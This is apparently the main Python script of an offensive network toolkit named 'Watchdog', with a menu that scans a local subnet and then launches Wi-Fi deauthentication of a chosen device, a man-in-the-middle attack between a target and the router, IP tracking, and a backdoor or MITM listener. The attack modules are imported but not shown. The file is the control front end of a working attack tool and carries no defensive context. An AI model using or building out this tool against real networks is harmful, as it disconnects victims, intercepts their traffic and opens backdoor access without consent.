from sys import exit as system_exit
from subprocess import check_output as execute_check_output
from getmac import get_mac_address
from tabulate import tabulate
from network_scanner import NetworkScanner
from deauther import Deauther
from mitm import MITM
from track_ip import TrackIP
from backdoor_listener import BackdoorListener
from mitm_listener import MitmListener


class Watchdog:
	def __init__(self):
		self.network_interface, self.network_channel = execute_check_output("iwgetid -c", shell=True, encoding="utf-8").split()
		self.router_bssid = execute_check_output("iwgetid -a", shell=True, encoding="utf-8").split()[-1]
		self.my_ip = execute_check_output("hostname -I", shell=True).split()[0].decode("utf-8")
		self.my_mac = get_mac_address()
		self.device_list = []
		self.command_list: dict[str, tuple[str, callable]] = {
            "1": ("Scan Network", self.scan_network),
            "2": ("Deauth User", self.deauth_device),
            "3": ("MITM Attack", self.mitm_attack),
            "4": ("Track IP", self.track_ip),
            "5": ("Listener", self.listener),
            "q": ("Quit", self.exit_program),
        }
	
	def show_menu(self):
		print(" ".join([f"'{key}'-{description}" for key, (description, _) in watchdog.command_list.items()]))

	def exit_program(self):
		print("\nExiting...")
		system_exit()

	def scan_network(self):
		network_scanner = NetworkScanner()
		# network_scanner.network_range = input("\nPlease enter the network range (ex: 192.168.1.0/24) -> ")
		network_scanner.network_range = "192.168.1.0/24"
		network_scanner.scan_network()
		self.device_list = network_scanner.device_list
		table_headers = ["id", "IP", "MAC", "Vendor", "Hostname"]
		print(f"\n{tabulate(tabular_data=self.device_list, headers=table_headers, tablefmt="simple", showindex="always")}")
		
	def deauth_device(self):
		self.scan_network()
		attack_info = input("\nPlease select the target id and enter package number - 'q' to exit (ex: 2 50) -> ")
		if attack_info != "q":
			target_id, package_number = attack_info.split()
			target_mac = self.device_list[int(target_id)][1]
			deauther = Deauther(self.network_interface, self.network_channel, self.router_bssid)
			deauther.deauth_device(target_mac, package_number)
		else:
			print("\nAttack canceled!")

	def mitm_attack(self):
		self.scan_network()
		target_id = input("\nPlease select a target id ('q' to exit) -> ")
		if target_id != "q":
			mitm = MITM(self.device_list[int(target_id)][0], self.device_list[int(target_id)][1], self.device_list[0][0], self.device_list[0][1], self.network_interface)
			mitm.start_mitm()	
		else:
			print("\nAttack canceled!")

	def track_ip(self):
		ip_address = input("\nPlease enter an IP address ('q' to exit) -> \n")
		if ip_address != "q":
			ip_tracker = TrackIP(ip_address)
			for k, v in ip_tracker.track_ip().items():
				print(f"{k}: {v}")
		else:
			print("\nAttack Canceled!")

	def listener(self):
		listener_type = input("'1'-Backdoor Listener '2'-MITM Listener ('q' to exit) -> ")
		if listener_type == "1":
			listening_port = int(input("Please enter the port number: "))
			listener = BackdoorListener(self.my_ip, listening_port)
			listener.start_connection()
		elif listener_type == "2":
			listening_interface = input("Please enter the network interface: ")
			mitm_listener = MitmListener(listening_interface)
			mitm_listener.listener()
		else:
			print("\nAttack Canceled!")


if __name__ == "__main__":
	watchdog = Watchdog()
	while True:
		try:
			watchdog.show_menu()
			command = input("Select a command -> ")
			action = watchdog.command_list.get(command)[1]
			if action:
				action()
			else:
				print("\nPlease select a valid command.")
		except KeyboardInterrupt:
			print("\nProgram is terminated!")
			system_exit()